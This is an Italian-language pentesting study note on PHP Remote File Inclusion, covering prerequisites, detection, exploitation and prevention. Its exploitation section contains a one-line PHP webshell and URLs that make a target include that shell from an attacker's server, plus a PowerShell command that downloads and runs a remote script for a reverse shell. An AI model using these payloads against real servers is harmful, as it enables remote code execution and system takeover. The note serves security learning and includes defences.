# RFI — Remote File Inclusion

**Categoria:** #web #injection #exploitation  
**Linguaggio:** PHP  
**OWASP:** [[A03-2021 Injection]]  
**Relazione:** [[LFI — Local File Inclusion]]

---

## 📖 Cos'è

RFI è una vulnerabilità PHP che permette a un attaccante di far includere al server un file da un **server remoto esterno** (controllato dall'attaccante). Se il file remoto contiene codice PHP, il server lo **esegue** — portando a RCE (Remote Code Execution).

---

## 🆚 RFI vs LFI vs Path Traversal

|Vulnerabilità|Cosa fa|Dove legge|
|---|---|---|
|Path Traversal|Legge file fuori dalla directory prevista|Filesystem locale|
|LFI|Include ed esegue file locali|Filesystem locale|
|RFI|Include ed esegue file remoti|Server dell'attaccante|

---

## ⚙️ Prerequisiti

RFI richiede queste impostazioni in `php.ini`:

```ini
allow_url_include = On   ; disabilitato di default in PHP moderno
allow_url_fopen = On     ; abilitato di default
```

> ⚠️ Nelle versioni moderne di PHP `allow_url_include` è **Off di default** — RFI è quindi rara su installazioni recenti ma ancora presente su sistemi legacy

---

## 🔍 Come identificarlo

URL vulnerabile:

```
http://target.com/index.php?page=about.html
```

Test RFI:

```
http://target.com/index.php?page=http://evil.com/test.txt
```

Se il server risponde con il contenuto di `test.txt` → vulnerabile a RFI.

---

## 💥 Exploitation — Webshell via RFI

### Step 1 — Crea la webshell sul tuo server

```php
<?php system($_GET['cmd']); ?>
```

Salvala come `shell.php`.

### Step 2 — Avvia un server HTTP sulla tua macchina

```bash
python3 -m http.server 8080
# oppure
php -S 0.0.0.0:8080
```

### Step 3 — Includi la webshell via RFI

```
http://target.com/index.php?page=http://<TUO_IP>:8080/shell.php&cmd=whoami
```

### Step 4 — Reverse shell

```
http://target.com/index.php?page=http://<TUO_IP>:8080/shell.php&cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://<TUO_IP>/rev.ps1')"
```

---

## 🛡️ Come si previene

```ini
; php.ini
allow_url_include = Off
allow_url_fopen = Off
```

```php
// Whitelist dei file consentiti
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
}
```

---

## 📚 Lezioni apprese

- RFI richiede `allow_url_include = On` — rara su PHP moderno ma comune su sistemi legacy
- RFI è più pericolosa di LFI perché porta direttamente a RCE
- Su PHP moderno dove RFI non funziona, spesso LFI è ancora possibile
- Sempre testare entrambe quando si trova un parametro `page=` o `file=`

---

## 🔗 Riferimenti

- [[LFI — Local File Inclusion]]
- [[A03-2021 Injection]]
- [HackTricks - RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion#rfi-remote-file-inclusion)
- [OWASP - RFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)

---

## Tags

#rfi #remote-file-inclusion #php #web #injection #rce #webshell #lfi #owasp